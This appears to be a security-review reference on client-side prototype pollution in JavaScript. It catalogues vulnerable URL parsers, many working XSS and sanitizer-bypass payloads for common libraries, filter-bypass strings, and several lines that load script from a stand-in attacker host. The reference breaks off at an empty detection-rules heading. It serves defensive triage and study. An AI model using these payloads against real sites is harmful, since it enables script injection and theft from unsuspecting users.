---
name: client-side-prototype-pollution
description: Client-Side Prototype Pollution (CSPP) — pollution sources (URL query, hash, JSON, postMessage), browser-resident pollution sinks (URL/hash parsers, jQuery `$.extend`, hand-rolled merges), and the script-gadget catalog (sanitizer bypasses, browser-API gadgets) that escalates pollution to DOM XSS / open redirect / cookie injection in the user's browser
---

# Client-Side Prototype Pollution (CSPP)

**CWE coverage**: CWE-1321 (primary, *Improperly Controlled Modification of Object Prototype Attributes*) plus the downstream CWEs the gadget actually lands. Prototype-pollution detection maps to **CWE-79** (DOM XSS), **CWE-94** (code injection), **CWE-400** (resource exhaustion), **CWE-471** (modification of assumed-immutable data); browser-API gadgets land **CWE-601** (open redirect) and cookie-injection variants. Choose the downstream CWE that matches the gadget reached.

Client-Side Prototype Pollution lets an attacker inject a property into `Object.prototype` (or `Array.prototype`, `String.prototype`, etc.) **inside the victim's browser**. Like SSPP, the pollution itself is rarely the impact — it is an *amplifier* that becomes DOM XSS, sanitizer bypass, open redirect, or arbitrary script load only when combined with a downstream **gadget**: existing client-side code (in the page bundle, a third-party tag, or even a built-in browser API) that reads an undefined property and uses it as a security-sensitive parameter (`innerHTML`, `src`, `href`, `srcdoc`, `onerror`, `template`, `whiteList`, `ALLOWED_ATTR`, `sourceURL`, etc.).

A vulnerable page therefore needs two things to be exploitable:

1. **A pollution source/sink in the browser** — a place where attacker-controlled keys flow into a write of the form `target[__proto__][key] = value`, `target.constructor.prototype[key] = value`, or `target.prototype[key] = value`. In the browser this is most commonly:
   - A library that parses `location.search` / `location.hash` into a nested object using `__proto__` / `constructor[prototype]` bracket notation (the PP-vulnerable URL/hash parser catalog: `jquery-deparam`, `jquery-bbq`, `MooTools More`, `purl`, `arg.js`, `Aurelia path`, `analytics-utils`, `CanJS deparam`, etc.).
   - `$.extend(true, target, attackerJSON)` (jQuery deep merge), `_.merge` / `_.set` shipped in the page bundle, hand-rolled `for…in` recursive copy, hand-rolled hash parsers (`split('&').reduce((a,kv) => …)`).
   - `JSON.parse` of attacker JSON followed by a deep-merge into a real object (postMessage / WebSocket payloads, `localStorage` consumers).
2. **A script gadget** — code in the same realm that reads an undefined property from an inherited prototype after pollution. This is either an **app-bundle gadget**, a **library gadget** (the script-gadget catalog: jQuery `$.get`/`$(html)`/`$(x).attr`/`$(x).on`, Bootstrap-style merges, `recaptcha`, `Twitter UWT`, `Tealium`, `Akamai Boomerang`, `lodash` template, `sanitize-html`/`DOMPurify`/`js-xss`/`Closure` sanitizer-config gadgets, `Marionette.js`, `Adobe DTM`, `Knockout.js`, `Zepto.js`, `Sprint.js`, `Vue.js`, `Popper.js`, `Pendo Agent`, `script.aculo.us`, `hCaptcha`, `Google Tag Manager`, `Google Analytics`, etc.), or — since 2023 — a **built-in browser-API gadget** (`URL` reading `href`, `Notification` reading `title`, `Worker` reading `name`, `Image` reading `src`, `URLSearchParams` reading `toString`).

Named guard predicates used in detection: `HasOwnPropertyGuard`, `BlacklistEqualityGuard`, `WhitelistEqualityGuard`, `InExprGuard`, `InstanceOfGuard`, `TypeofGuard`, `IsPlainObjectGuard`, `BlacklistInclusionGuard`, `WhitelistInclusionGuard`, `ObjectCreateNullCall`.

For the **server-side variant** (Node.js / Deno / NPM-package gadgets, RCE/SSRF chains, `execArgv`, `lodash.template`, `bson`, `child_process`), see `references/server_side_prototype_pollution.md` — sources, sinks, and the conceptual flow are the same; only the gadget surface differs.

---

## Where to Look

**Pollution sources (browser-resident)**
- `location.search` query string parsed into a nested object (`?__proto__[gadget]=value`, `?__proto__.gadget=value`, `?constructor[prototype][gadget]=value`).
- `location.hash` URL fragment (`#__proto__[gadget]=value`); never sent to the server, executes purely in-browser.
- `JSON.parse` of attacker JSON from the URL, `localStorage`/`sessionStorage`, IndexedDB, postMessage, WebSocket, EventSource/SSE, fetched JSON responses where the attacker controls a reflected/cached field.
- `postMessage` event handlers that merge `event.data` into a config object.
- WebSocket / SSE / shared-worker messages merged into a state store.
- File uploads parsed into FormData with attacker-controlled field names.
- Cookies decoded as JSON then merged.
- Diagram/charting library config: an inline `init`/`directive` block in user content (e.g. ` ```mermaid ` with `%%{init: {...}}%%`, or a chart `init` JSON) deep-merged into the renderer's options — `__proto__` in that config pollutes the prototype and reaches a render/template gadget (stored XSS). Cross-ref `xss.md` (client-side diagram/charting renderers).

**Pollution sinks (browser-resident merges/parsers)**
- Parser-catalog URL/hash parsers that walk `__proto__` / `constructor[prototype]`:
  - `jquery-query-object` (CVE-2021-20083), `jquery-sparkle` (CVE-2021-20084), `backbone-query-parameters` (CVE-2021-20085), `jquery-bbq` (CVE-2021-20086), `jquery-deparam` (CVE-2021-20087), `MooTools More` (CVE-2021-20088), `purl` / jQuery-URL-Parser (CVE-2021-20089).
  - `V4Fire Core`, `CanJS deparam`, `HubSpot Tracking Code`, `YUI 3 querystring-parse`, `Mutiny`, `jQuery parseParams`, `php.js parse_str`, `arg.js`, `davis.js`, `Component querystring`, `Aurelia path`, `analytics-utils < 1.0.3`, `Wistia Embedded Video`, `Swiftype Site Search`.
- Generic browser-side merge / extend / set: `$.extend(true, target, src)` (jQuery deep merge — CVE-2023-26136 / CVE-2023-26140 in 3.6.0–3.6.3), `_.merge`, `_.mergeWith`, `_.defaultsDeep`, `_.set`, `_.setWith`, `_.zipObjectDeep` shipped in the page bundle, `deepmerge`, `merge-deep`, `extend`, `just-extend`, hand-rolled recursive `for…in` merges.
- Hand-rolled hash parsers: `location.hash.slice(1).split('&').reduce(...)` patterns that walk attacker keys.
- Functions matching the prototype-pollution-utility shape — recursive copy where the destination base, key, AND right-hand side all derive from an enumerated property name.

**Script gadgets (where polluted defaults turn into XSS)**
- App code: any `if (config.<flag>) ...` / `el.innerHTML = config.<x>` / `new Image().src = config.<src>` reading a config-style object.
- Library gadgets: see the script-gadget table below.
- Browser-API gadgets (any page, any origin, since 2023): see Browser-API Gadgets below.
- HTML sanitizers configured via attacker-pollutable option keys: `sanitize-html`, `DOMPurify`, `js-xss`, `Closure HtmlSanitizer`.

---

## Core Mechanic

```javascript
// 1) attacker delivers a payload via a URL the victim opens:
//    https://victim.example/?__proto__[innerHTML]=<img/src/onerror=alert(1)>

// 2) a URL-parsing library on the page (e.g., jquery-deparam) walks
//    bracket notation including __proto__ keys, ending in a write like:
target['__proto__']['innerHTML'] = '<img/src/onerror=alert(1)>';

// 3) Object.prototype.innerHTML is now the malicious string. Every
//    {} / new Object() in the realm sees it via prototype-chain lookup.
({}).innerHTML // → "<img/src/onerror=alert(1)>"

// 4) any later code that reads an undefined `innerHTML` from a config-style
//    object — even built-in browser APIs — picks up the polluted default
//    and renders it as HTML. With the right gadget, this is reliable XSS.
```

Two things to remember about CSPP that differ from server-side:

- **Hash payloads do not hit the server.** `#__proto__[gadget]=…` is browser-only — no WAF/server-side filter ever sees it. Some PP libraries are only exploitable via the hash (`Swiftype Site Search`, `jquery-query-object` hash branch, Purl).
- **Browser path normalization does NOT apply** to query strings or fragments. `?__proto__[x]=y` and `#__proto__[x]=y` reach the JS exactly as written; encoding tricks are needed only to bypass app-side filters, not the browser.

---

## Source -> Sink -> Gadget Pattern

**Sources** (decoded by the URL/hash/JSON parser — DANGEROUS when the parser walks `__proto__` keys)

| Source | Vehicle | Notes |
|--------|---------|-------|
| `location.search` | Reflected URL share, `?__proto__[x]=y` | `?__proto__.x=y` (dot notation) and `?constructor[prototype][x]=y` (constructor-based) are alternate forms |
| `location.hash` | Browser-only, `#__proto__[x]=y` | Never reaches server; bypasses every server-side filter and most CDN-level WAFs |
| `JSON.parse` of attacker JSON | postMessage / WS / fetched API / storage | `__proto__` becomes own property of parsed object — only escalates if a downstream `_.merge`/recursive copy walks it onto the prototype |
| `postMessage` | Cross-window child/parent | Common when iframes accept config from parent without origin check |
| `localStorage` / `sessionStorage` | Cached attacker payload from earlier session | Stored CSPP — fires on every reload until storage is cleared |
| WebSocket / SSE | Live attacker channel | Tenant-isolated apps may be polluted by a single message |
| Cookies | JSON-encoded cookie merged into config | Set by a separate vulnerability (CRLF, sub-domain takeover) |

**Sinks** (the parser/merge call that does the prototype write)

```javascript
// VULN — jQuery deep extend
$.extend(true, target, JSON.parse(payload));         // CVE-2023-26136 / -26140 in 3.6.0–3.6.3

// VULN — lodash merge in the browser bundle
_.merge(target, payload);                            // CVE-2018-16487 in lodash < 4.17.11
_.set(obj, userPath, userVal);                       // path may be "__proto__.x"

// VULN — hand-rolled hash parser (extremely common in legacy bundles)
location.hash.slice(1).split('&').forEach(kv => {
  const [k, v] = kv.split('=');
  const keys = decodeURIComponent(k).split('.');
  let o = config;
  for (let i = 0; i < keys.length - 1; i++) o = o[keys[i]] ||= {};
  o[keys.at(-1)] = decodeURIComponent(v || '');
});                                                  // VULN — walks __proto__/constructor

// VULN — recursive for…in merge (matches prototype-pollution-utility pattern)
function merge(dst, src) {
  for (const key in src) {                           // walks inherited keys
    if (typeof src[key] === 'object') merge(dst[key] = dst[key] || {}, src[key]);
    else dst[key] = src[key];
  }
}
merge(globalConfig, JSON.parse(event.data));         // VULN
```

**Gadgets** (where the polluted default becomes a security-sensitive read)

```javascript
// 1) App-bundle gadget — reads optional flag/template
if (config.theme) document.body.setAttribute('class', config.theme);    // gadget when theme polluted with class injection
el.innerHTML = config.welcome ?? '';                                    // → XSS when welcome polluted with <img onerror=…>

// 2) Library gadget (script-gadget catalog) — see tables below

// 3) Browser-API gadget (2023+) — works on every page after pollution
new URL('#');                                                           // reads polluted Object.prototype.href → javascript: navigation
```

---

## Pollution → DOM XSS Escalation Chain

SAST triage requires four linked stages in the **same realm**. Sink-only or gadget-only hits stay LOW until the chain is complete.

| Stage | What to find | Client indicator |
|-------|--------------|------------------|
| Source | Attacker-controlled parse input | `location.search`, `location.hash`, `postMessage` `event.data`, client `JSON.parse` of storage/WS payload |
| Sink | Prototype write via merge or bracket walk | `_.merge`, `$.extend(true,…)`, hand-rolled `for…in`, hash/query parsers |
| Gadget read | Inherited default on config-style object | `obj.<key>`, `obj.<key> ?? default`, optional chaining on unset flag |
| DOM impact | Polluted value reaches HTML/URL/script sink | `innerHTML`, `srcdoc`, `src`, sanitizer `ALLOWED_ATTR`/`whiteList`, `new URL().href` |

```javascript
// source → sink → gadget → DOM XSS (one chain)
const params = parseQuery(location.search);            // VULN — walks __proto__
_.merge(appConfig, params);                           // VULN — pollution sink
document.getElementById('x').innerHTML = appConfig.title ?? '';  // gadget + DOM sink → XSS
```

Primary browser sources for taint: **`location.search`**, **`location.hash`**, **`postMessage`** payloads merged without origin/key guard. Hash payloads never reach the server — prioritize parsers bound to `location.hash`.

---

## Realm Isolation — Pollution Does Not Cross Realms

Each JavaScript *realm* has its own `Object.prototype`, `Array.prototype`, etc. Pollution in one realm does NOT reach another. Relevant boundaries when triaging:

| Boundary | Same realm? | Notes |
|----------|:----------:|-------|
| Main thread vs `<iframe>` | NO | Cross-origin iframes are clearly isolated; **same-origin iframes are also a separate realm** — pollution must be reproduced on each iframe's `Object.prototype` independently |
| Main thread vs `Worker` / `SharedWorker` | NO | Pollution in main thread does NOT reach the worker; the worker has its own prototypes |
| Main thread vs `ServiceWorker` | NO | Separate realm; ServiceWorker controls fetch interception but cannot read main-thread pollution |
| Main thread vs `vm.runInNewContext` / `ShadowRealm` | NO | Each new realm has fresh prototypes |
| Document via `document.open()` / nested same-origin frames after `document.write` | depends | Typically a *new* realm, but legacy "wide-open" iframes can share — verify empirically |

**Triage implication**: a CSPP finding that proves pollution in the main thread does NOT automatically extend to gadgets that live in a `Worker`, `<iframe>`, or `ServiceWorker`. To chain into those, the attacker needs a separate pollution source reachable from that realm (e.g., `postMessage` payload merged in the iframe, hash payload parsed in a worker). Conversely, an iframe that hosts a vulnerable URL parser pollutes only its own realm — the parent page is safe unless it merges values back from the iframe via `postMessage` into its own real object.

## Other Pollution-Adjacent Sinks (often missed)

### `Object.defineProperty(target, userKey, descriptor)`

When `userKey` is attacker-controlled and `target` is (or can be tricked into being) `Object.prototype`, this is a pollution write:

```javascript
// VULN — userKey is attacker-controlled; target reachable as Object.prototype
Object.defineProperty(target, userKey, { value: userValue });
// e.g., userKey = "isAdmin", target = ({}).__proto__ → pollutes Object.prototype.isAdmin
```

Beware: `Object.defineProperty` can set non-enumerable / non-configurable descriptors, which makes the pollution *harder to clean up* than a plain assignment — a frozen-after-pollution prototype is effectively permanent for the realm lifetime.

### `Object.defineProperty(obj, key, descriptor)` with an omitted `value`/`get` — descriptor-inheritance gadget (defeats a `defineProperty` "lock")

A common (flawed) mitigation is to "lock" a sensitive property with `Object.defineProperty(config, 'transportUrl', { configurable: false, writable: false })` so attacker merges can't overwrite it. But the **descriptor object is itself a plain object** — when it omits `value` (and `get`), `defineProperty` reads those attributes through the prototype chain. Polluting `Object.prototype.value` therefore supplies the value the developer thought they had pinned to `undefined`, so the "locked" property silently takes the attacker's value:

```javascript
// VULN — descriptor omits `value`; defineProperty reads `value` via the prototype
function loadConfig() {
  const config = { params: parseQuery(location.search) };
  // developer intends transportUrl to stay falsy / locked:
  Object.defineProperty(config, 'transportUrl', { configurable: false, writable: false });
  if (config.transportUrl) {                 // gadget read
    const s = document.createElement('script');
    s.src = config.transportUrl;             // DOM sink → script load / XSS
    document.body.appendChild(s);
  }
}
// pollution payload: ?__proto__[value]=data:,alert(1)
//   defineProperty's descriptor has no own `value` → inherits Object.prototype.value
//   → config.transportUrl === "data:,alert(1)" despite the "lock"
```

Treat any `Object.defineProperty(obj, key, descriptor)` / `Object.defineProperties(obj, descs)` where the descriptor literal does **not** explicitly set `value` (or `get`) as a gadget when `obj`/`key` later drives an HTML/URL/script/auth read — pollution of `Object.prototype.value` (or `Object.prototype.get`) is the trigger. The same applies to `Reflect.defineProperty`. Grep `Object\.define(Propert(y|ies))` and confirm each descriptor sets its own `value`/`get`.

### `Object.setPrototypeOf(target, attackerObj)`

Not a pollution write per se, but a related primitive: attacker controls what `target`'s prototype becomes. If `target` is a long-lived shared object, this is functionally equivalent to pollution for that object's consumers.

### Proxy traps reading `Object.prototype` defaults

A `Proxy` whose `get` trap falls through to `Reflect.get(target, prop)` will return polluted defaults exactly like a plain object — Proxies do not insulate from prototype pollution unless the trap explicitly returns `undefined` for non-own properties.

## Vulnerable URL/Hash Parser Catalog

These libraries parse `location.search` and/or `location.hash` into a nested object that walks `__proto__` or `constructor[prototype]` keys. Inclusion means a bare visit to a crafted URL pollutes `Object.prototype` for the rest of the page session.

| Library | Trigger payload (representative) | CVE | Notes |
|---------|-----------------------------------|-----|-------|
| `Wistia Embedded Video` | `?__proto__[test]=test`, `?__proto__.test=test` | (fixed) | Bracket and dot notation |
| `jquery-query-object` | `?__proto__[test]=test`, `#__proto__[test]=test` | CVE-2021-20083 | Hash branch — bypasses server-side filtering |
| `jquery-sparkle` | `?__proto__.test=test`, `?constructor.prototype.test=test` | CVE-2021-20084 | Constructor-based bypass works |
| `V4Fire Core Library` | `?__proto__.test=test`, `?__proto__[test]=test`, `?__proto__[test]={"json":"value"}` | — | JSON-value variant |
| `backbone-query-parameters` | `?__proto__.test=test`, `?constructor.prototype.test=test`, `?__proto__.array=1\|2\|3` | CVE-2021-20085 | Array-flavored variant |
| `jquery-bbq` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | CVE-2021-20086 | |
| `jquery-deparam` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | CVE-2021-20087 | Widely embedded in legacy plugins |
| `MooTools More` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | CVE-2021-20088 | |
| `Swiftype Site Search` | `#__proto__[test]=test` | (fixed) | **Hash-only** — never reaches WAF |
| `CanJS deparam` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | — | |
| `Purl (jQuery-URL-Parser)` | `?__proto__[test]=test`, `?constructor[prototype][test]=test`, `#__proto__[test]=test` | CVE-2021-20089 | Both query + hash branches |
| `HubSpot Tracking Code` | `?__proto__[test]=test`, `?constructor[prototype][test]=test`, `#__proto__[test]=test` | (fixed) | Often bundled invisibly via marketing tag |
| `YUI 3 querystring-parse` | `?constructor[prototype][test]=test` | — | Constructor-only — `__proto__` filtered |
| `Mutiny` | `?__proto__.test=test` | (fixed) | |
| `jQuery parseParams` | `?__proto__.test=test`, `?constructor.prototype.test=test` | — | |
| `php.js parse_str` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | — | The PHP-emulation port |
| `arg.js` | `?__proto__[test]=test`, `?__proto__.test=test`, `?constructor[prototype][test]=test`, `#__proto__[test]=test` | — | Most permissive parser; all four notations work |
| `davis.js` | `?__proto__[test]=test` | — | |
| `Component querystring` | `?__proto__[NUMBER]=test`, `?__proto__[123]=test` | — | Polllutes `Array.prototype` indices |
| `Aurelia path` | `?__proto__[test]=test` | — | |
| `analytics-utils < 1.0.3` | `?__proto__[test]=test`, `?constructor[prototype][test]=test` | — | |

Recheck for newly disclosed parsers/gadgets before triage.

---

## Script Gadget Catalog

If pollution is confirmed, these are the existing in-the-wild gadgets that turn pollution into XSS, sanitizer bypass, cookie injection, or arbitrary script load. Many ship invisibly via marketing/analytics tags.

| Gadget | Pollution payload (representative) | Impact |
|--------|------------------------------------|--------|
| `Wistia Embedded Video` | `?__proto__[innerHTML]=<img/src/onerror=alert(1)>` | XSS |
| `jQuery $.get` (all versions) | `?__proto__[context]=<img/src/onerror=alert(1)>&__proto__[jquery]=x` | XSS |
| `jQuery $.get >= 3.0.0` | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script` *(also works with `Boolean.prototype` pollution variant)* | XSS |
| `jQuery $.getScript >= 3.4.0` | `?__proto__[src][]=data:,alert(1)//` | XSS |
| `jQuery $.getScript 3.0.0–3.3.1` | `?__proto__[url]=data:,alert(1)//` (Boolean.prototype variant) | XSS |
| `jQuery $(html)` | `?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror=alert(1)>` | XSS |
| `jQuery $(x).off` | `?__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror=alert(1)>` (String.prototype variant) | XSS |
| `jQuery $(x).attr` (>= 1.8.0) | `?__proto__[OnError]=alert(1)&__proto__[SRC]=fakeimagewontload.jpg` | XSS |
| `jQuery $(x).on / submit` (>= 1.9.0) | `?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror=alert(1)>&__proto__[focus]=x&__proto__[needsContext]=x` | XSS |
| `Google reCAPTCHA` | `?__proto__[srcdoc][]=<script>alert(1)</script>` | XSS |
| `Twitter Universal Website Tag` | `?__proto__[hif][]=javascript:alert(1)` | XSS *(fixed)* |
| `Tealium Universal Tag` | `?__proto__[attrs][src]=1&__proto__[src]=data:,alert(1)//` | XSS |
| `Akamai Boomerang` | `?__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js` | XSS |
| `Lodash <= 4.17.15` | `?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)` | XSS via template `sourceURL` |
| `sanitize-html` | `?__proto__[*][]=onload` | Sanitizer bypass → XSS |
| `sanitize-html` | `?__proto__[innerText]=<script>alert(1)</script>` | Sanitizer bypass → XSS |
| `js-xss` | `?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src` | Sanitizer bypass → XSS |
| `DOMPurify <= 2.0.12` | `?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src` | Sanitizer bypass → XSS |
| `DOMPurify <= 2.0.12` | `?__proto__[documentMode]=9` | Sanitizer bypass via legacy IE-mode quirks |
| `Google Closure HtmlSanitizer` | `?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1` | Sanitizer bypass → XSS |
| `Google Closure HtmlSanitizer` | `?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//` | XSS via base-path injection |
| `Google Closure (trustedTypes)` | `?__proto__[trustedTypes]=x&__proto__[emptyHTML]=<img/src/onerror=alert(1)>` | XSS — bypasses Trusted Types policy |
| `Marionette.js / Backbone.js` | `?__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)` | XSS |
| `Adobe Dynamic Tag Management` | `?__proto__[src]=data:,alert(1)//` *(or `?__proto__[SRC]=<img …>`)* | XSS |
| `Swiftype Site Search` | `?__proto__[xxx]=alert(1)` | XSS |
| `Embedly Cards` | `?__proto__[onload]=alert(1)` | XSS |
| `Segment Analytics.js` | `?__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror=alert(1)>` | XSS |
| `Knockout.js` (Array.prototype) | `?__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,` | XSS via template eval |
| `Zepto.js` | `?__proto__[onerror]=alert(1)` | XSS |
| `Zepto.js` | `?__proto__[html]=<img/src/onerror=alert(1)>` | XSS |
| `Sprint.js` | `?__proto__[div][intro]=<img src onerror=alert(1)>` | XSS |
| `Vue.js` (v2) | `?__proto__[v-if]=_c.constructor('alert(1)')()` | XSS |
| `Vue.js` (v2) | `?__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script` | XSS |
| `Vue.js` (v2) | `?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()` | XSS |
| `Vue.js` (v2) | `?__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>alert(1)</script>` | XSS |
| `Vue.js` (v2) | `?__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('alert(1)')(),"` | XSS |
| `Vue.js` (v2) | `?__proto__[template]=<script>alert(1)</script>` | XSS |
| `Demandbase Tag` | `?__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?` | XSS |
| `@analytics/google-tag-manager` | `?__proto__[customScriptSrc]=//attacker.tld/xss.js` | XSS via arbitrary script load |
| `i18next` (and < 19.8.5 / >= 19.8.5 variants) | `?__proto__[lng]=cimode&__proto__[appendNamespaceToCIMode]=x&__proto__[nsSeparator]=<img/src/onerror=alert(1)>` | Potential XSS |
| `Google Analytics` | `?__proto__[cookieName]=COOKIE%3DInjection%3B` | Cookie injection |
| `Popper.js` | `?__proto__[arrow][style]=color:red;transition:all 1s&__proto__[arrow][ontransitionend]=alert(1)` *(also `[reference]` and `[popper]` variants)* | XSS via CSS-transition handler |
| `Pendo Agent` | `?__proto__[dataHost]=attacker.tld/js.js%23` | XSS |
| `script.aculo.us` (String.constructor) | `?x=x&x[constructor][__parseStyleElement][innerHTML]=<img/src/onerror=alert(1)>` | XSS |
| `hCaptcha` | `?__proto__[assethost]=javascript:alert(1)//` | XSS *(fixed)* |
| `Google Tag Manager` | `?__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<script>alert(1)</script>` | XSS |
| `Google Tag Manager` / `Google Analytics` | `?__proto__[q][0][0]=require&__proto__[q][0][1]=x&__proto__[q][0][2]=https://www.google-analytics.com/gtm/js?id=GTM-WXTDWH7` | XSS via arbitrary GTM container load |

The presence of any of these libraries in a page's bundle is a high-confidence escalation path from any pollution source on the same origin — gadgets compose across libraries: pollution from a hash-only parser like `Swiftype` can reach a sanitizer-bypass gadget in `DOMPurify` if both load on the same page.

---

## Browser-API Gadgets

**Built-in browser APIs themselves are gadgets** once `Object.prototype` is polluted — this means even a page whose own bundle and third-party tags are clean may be exploitable through standard `URL` / `Notification` / `Worker` / `Image` / `URLSearchParams` constructors. Behavior is engine/version-dependent and not universally exploitable.

| Gadget API | Polluted property read | Primitive |
|------------|------------------------|-----------|
| `new URL('#')` | `Object.prototype.href` | Potential XSS/open-redirect via `javascript:` URL navigation when the URL is later assigned to `location` / used with `<a href>` — engine-dependent, not a guaranteed primitive |
| `new Notification('test')` | `title` | `alert()` payload via notification click |
| `new Worker(blob)` | `name` | JS execution inside the dedicated Worker |
| `new Image()` | `src` | Traditional `onerror` XSS — the polluted `src` is dereferenced when the image errors |
| `new URLSearchParams()` | `toString` | DOM-based open redirect via stringification in `location.assign(...)` paths |
| `fetch(url, { method:'GET' })` (partial options) | `headers`; `method`; `body`; `referrer`; `integrity` | Request smuggling / CSRF-style state change from the browser — a `fetch` call that omits these reads them through the polluted prototype, so the request carries attacker-controlled headers/body. Often chained: the attacker-shaped response field is later read into an `innerHTML`/`src` app gadget → DOM XSS |

A typical dynamic confirmation, harmless variant:

```html
<script>
  // For demo we pollute manually; in the wild the source is one of the parsers above.
  Object.prototype.href = 'javascript:alert(`polluted`)';
  new URL('#');     // → engine-dependent: may alert in some Chrome versions; not reliably exploitable across browsers
</script>
```

Because these gadgets live in the runtime itself, **every** application becomes exploitable as soon as a pollution source is reached — the sanitizer-bypass / library-gadget steps are no longer required. This is the strongest argument for `Object.freeze(Object.prototype)` early in the page lifecycle.

---

## HTML Sanitizer Bypass Patterns

Sanitizer libraries take a **config object** (`ALLOWED_ATTR`, `whiteList`, `*` allow-rule) that is read with optional-chaining. Polluting the config keys via `Object.prototype` makes the sanitizer trust attacker-supplied attributes/elements. These payloads survive sanitization on the polluted page only.

```html
<!-- DOMPurify <= 2.0.12 — polluted ALLOWED_ATTR allows onerror+src -->
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
<!-- attacker then submits an HTML payload and DOMPurify lets it through -->
DOMPurify.sanitize('<img src=x onerror=alert(1)>')   // → unchanged in polluted page

<!-- DOMPurify <= 2.0.12 — IE-quirks-mode handling -->
?__proto__[documentMode]=9

<!-- sanitize-html — wildcard attr allow -->
?__proto__[*][]=onload
sanitizeHtml('<a onload=alert(1)>')                  // → unchanged in polluted page

<!-- sanitize-html — innerText sink revealed via polluted default -->
?__proto__[innerText]=<script>alert(1)</script>

<!-- js-xss — whiteList for img -->
?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src

<!-- Google Closure HtmlSanitizer — wildcard attribute key bypass -->
<script>
  Object.prototype['* ONERROR'] = 1;
  Object.prototype['* SRC'] = 1;
</script>
<!-- closure now keeps onerror and src on every element -->

<!-- Google Closure — polluted base path silently loads attacker JS -->
?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//

<!-- Google Closure — Trusted Types policy bypass via polluted emptyHTML -->
?__proto__[trustedTypes]=x&__proto__[emptyHTML]=<img/src/onerror=alert(1)>
```

The fix every sanitizer maintainer eventually shipped: replace internal allow/deny maps with `Object.create(null)`, use `Object.hasOwn()` / `Object.prototype.hasOwnProperty.call(map, key)` for membership checks, and freeze critical objects at module load. DOMPurify's CVE-2024-45801 patch did exactly this — see Recent CVEs below.

---

## Constructor-Based Pollution Bypass

A common defensive pattern is to *strip property names equal to `__proto__`* from the user-controlled object before merging. This is **bypassable** because every JS object also exposes `constructor.prototype`, which is functionally equivalent to `__proto__`:

```javascript
let myObjectLiteral = {};
let myObject = new Object();

myObjectLiteral.constructor          // function Object(){...}
myObject.constructor.prototype       // Object.prototype  ← same target as __proto__
```

If the parser walks bracket notation, the following all reach `Object.prototype`:

```
?__proto__[gadget]=value             // classic
?__proto__.gadget=value              // dot-notation variant
?constructor[prototype][gadget]=value     // bypasses a strip-on-"__proto__" filter
?constructor.prototype.gadget=value       // dot-notation constructor variant
```

When a finding shows that `__proto__` is filtered, always test the `constructor[prototype]` variant before declaring SAFE.

---

## Double-Sanitization (Recursion-Less Strip) Bypass

A failed "strip-then-walk" defence is bypassable when the strip is non-recursive. This applies to **every** dangerous token, not just `__proto__` — if the filter also strips `constructor` and `prototype` once each, the same nesting trick reconstitutes those too, so the `constructor.prototype` route is **not** closed by a triple single-pass strip:

```
# __proto__ token
vulnerable.example/?__pro__proto__to__.gadget=payload
   strip "__proto__" (single pass)  →  ?__proto__.gadget=payload   ← valid source

# constructor + prototype tokens (defeats a filter that strips all three once)
vulnerable.example/?constconstructorructor[prototype][gadget]=payload
vulnerable.example/?constconstructorructor.prototype.gadget=payload
   strip "constructor" (single pass)  →  ?constructor[prototype][gadget]=payload

# both tokens nested at once (when "prototype" is also stripped)
vulnerable.example/?constconstructorructor[protoprototypetype][gadget]=payload
vulnerable.example/?constconstructorructor.protoprototypetype.gadget=payload
   strip "constructor" and "prototype" (single pass each)  →  ?constructor[prototype][gadget]=payload
```

Any time you see a string-replacement defense rather than an own-property guard, test the recursive-strip bypass for **all three tokens** (`__pro__proto__to__`, `constconstructorructor`, `protoprototypetype`) — a single-pass strip of `constructor`/`prototype` is just as bypassable as one of `__proto__`. Do NOT conclude the constructor route is dead just because `constructor`/`prototype` are stripped once.

---

## Recent CVEs (Client-Side, 2023–2025)

| CVE / Reference | Component | Vulnerable Range | Chain |
|-----------------|-----------|------------------|-------|
| CVE-2024-45801 | DOMPurify | ≤ 3.0.8 | Pollution of `Node.prototype.after` *before* DOMPurify initialised bypasses the `SAFE_FOR_TEMPLATES` profile → stored XSS. Patched by `Object.hasOwn()` checks and `Object.create(null)` for internal maps |
| CVE-2023-26136 / CVE-2023-26140 | jQuery (`$.extend`) | 3.6.0 – 3.6.3 | `$.extend(true, target, attackerJSON)` introduces arbitrary properties into `Object.prototype` in the browsing context; attackerJSON sourced from `location.hash` / postMessage / fetched config |
| sanitize-html < 2.8.1 (2023-10) | sanitize-html | < 2.8.1 | Malicious attribute list `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` bypasses the allow-list |
| CVE-2018-16487 | lodash `_.merge` | < 4.17.11 | Foundational merge-sink CVE; still reachable when an old lodash ships in a browser bundle |
| CVE-2021-20083..20089 | jquery-query-object, jquery-sparkle, backbone-query-parameters, jquery-bbq, jquery-deparam, MooTools More, Purl | (per CVE) | URL/hash parser walks `__proto__`/`constructor[prototype]` (parser catalog) |
| CVE-2019-7609 | Kibana | 6.6.0 | Server-side variant — included for completeness; see `references/server_side_prototype_pollution.md` |

---

## Detection Rules

### JS / TS Source Patterns

